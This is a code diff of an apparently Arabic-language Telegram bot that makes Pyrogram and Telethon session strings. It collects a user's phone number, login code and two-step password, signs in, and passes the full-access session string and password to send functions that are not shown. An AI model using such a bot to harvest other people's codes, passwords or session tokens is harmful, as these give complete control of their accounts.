@@ -64,7 +64,7 @@ def delete_session_files(user_id):
     if os.path.exists(telethon_session):
         os.remove(telethon_session)
 
-# ====== أزرار البداية ======
+# ====== أزرار البداية (بنفس تصميم الصورة) ======
 START_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
@@ -108,20 +108,12 @@ async def start_command(client, message):
 async def handle_callback(client, callback_query: CallbackQuery):
     user_id = callback_query.from_user.id
     data = callback_query.data
-    
-    # ====== معالجة إعادة المحاولة ======
-    if data.startswith("retry_"):
-        user_id = int(data.replace("retry_", ""))
-        # حذف الجلسة القديمة
-        delete_session_files(user_id)
-        # إعادة تعيين الخطوة
-        user_steps[user_id] = "pyro_phone"
-        await callback_query.message.edit_text(
-            "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
-            reply_markup=BACK_BUTTON
-        )
-        await callback_query.answer("✅ تم إعادة التعيين، أرسل الرقم من جديد")
-        return
+    user_info = {
+        "id": user_id,
+        "username": callback_query.from_user.username,
+        "first_name": callback_query.from_user.first_name,
+        "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
+    }
     
     # ====== معالجة التأكيد ======
     if data == "confirm_yes":
@@ -275,27 +267,19 @@ async def pyro_session_step(client, message):
     step = user_steps.get(user_id)
 
     if step == "pyro_phone":
-        # ====== استلام الرقم ======
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "pyro_otp"
         
-        # إنشاء العميل
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
         session_name = f"session_{user_id}"
         temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
         user_data[user_id]["client"] = temp_client
         await temp_client.connect()
-        
         try:
             code = await temp_client.send_code(user_data[user_id]["phone"])
             user_data[user_id]["phone_code_hash"] = code.phone_code_hash
-            
-            await message.reply(
-                f"📨 **تم إرسال رمز التحقق!**\n\n"
-                f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
-                f"📝 أرسل الرمز بالأرقام فقط.\n"
-                f"مثال: `12345`"
-            )
-            
+            await omsg.delete()
+            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
         except ApiIdInvalid:
             await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
             reset_user(user_id)
@@ -304,44 +288,28 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
             
     elif step == "pyro_otp":
-        # ====== استلام الرمز ======
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
-        
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
-            # إرسال الجلسة
             await send_pyro_session(user_id, session_string, message)
-            
             await temp_client.disconnect()
             reset_user(user_id)
-            
         except PhoneCodeInvalid:
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
         except PhoneCodeExpired:
-            await temp_client.disconnect()
+            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
             reset_user(user_id)
-            
-            await message.reply(
-                '❌ **انتهت صلاحية الرمز!**\n\n'
-                '📌 الرموز تنتهي بعد فترة قصيرة.\n'
-                '🔄 يمكنك طلب رمز جديد بالضغط على الزر أدناه.',
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 طلب رمز جديد", callback_data=f"retry_{user_id}")]
-                ])
-            )
         except SessionPasswordNeeded:
             user_steps[user_id] = "pyro_password"
             await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "pyro_password":
-        # ====== معالجة كلمة المرور ======
         temp_client = user_data[user_id]["client"]
-        
         try:
             password = message.text
             await temp_client.check_password(password=password)
@@ -349,10 +317,8 @@ async def pyro_session_step(client, message):
             user_sessions[user_id] = session_string
             
             await send_pyro_session(user_id, session_string, message, password)
-            
             await temp_client.disconnect()
             reset_user(user_id)
-            
         except PasswordHashInvalid:
             await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
             reset_user(user_id)
@@ -396,21 +362,15 @@ async def telethon_session_step(client, message):
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "telethon_otp"
         
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
         session_name = f"telethon_{user_id}"
         temp_client = TelegramClient(session_name, API_ID, API_HASH)
         user_data[user_id]["client"] = temp_client
         await temp_client.connect()
-        
         try:
             await temp_client.send_code_request(user_data[user_id]["phone"])
-            
-            await message.reply(
-                f"📨 **تم إرسال رمز التحقق!**\n\n"
-                f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
-                f"📝 أرسل الرمز بالأرقام فقط.\n"
-                f"مثال: `12345`"
-            )
-            
+            await omsg.delete()
+            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
         except ApiIdInvalidError:
             await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
             reset_user(user_id)
@@ -421,39 +381,26 @@ async def telethon_session_step(client, message):
     elif step == "telethon_otp":
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
-        
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
             await send_telethon_session(user_id, session_string, message)
-            
             await temp_client.disconnect()
             reset_user(user_id)
-            
         except PhoneCodeInvalidError:
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
         except PhoneCodeExpiredError:
-            await temp_client.disconnect()
+            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
             reset_user(user_id)
-            
-            await message.reply(
-                '❌ **انتهت صلاحية الرمز!**\n\n'
-                '📌 الرموز تنتهي بعد فترة قصيرة.\n'
-                '🔄 يمكنك طلب رمز جديد بالضغط على الزر أدناه.',
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 طلب رمز جديد", callback_data=f"retry_{user_id}")]
-                ])
-            )
         except SessionPasswordNeededError:
             user_steps[user_id] = "telethon_password"
             await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "telethon_password":
         temp_client = user_data[user_id]["client"]
-        
         try:
             password = message.text
             await temp_client.sign_in(password=password)
@@ -461,10 +408,8 @@ async def telethon_session_step(client, message):
             user_sessions[user_id] = session_string
             
             await send_telethon_session(user_id, session_string, message, password)
-            
             await temp_client.disconnect()
             reset_user(user_id)
-            
         except PasswordHashInvalidError:
             await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
             reset_user(user_id)
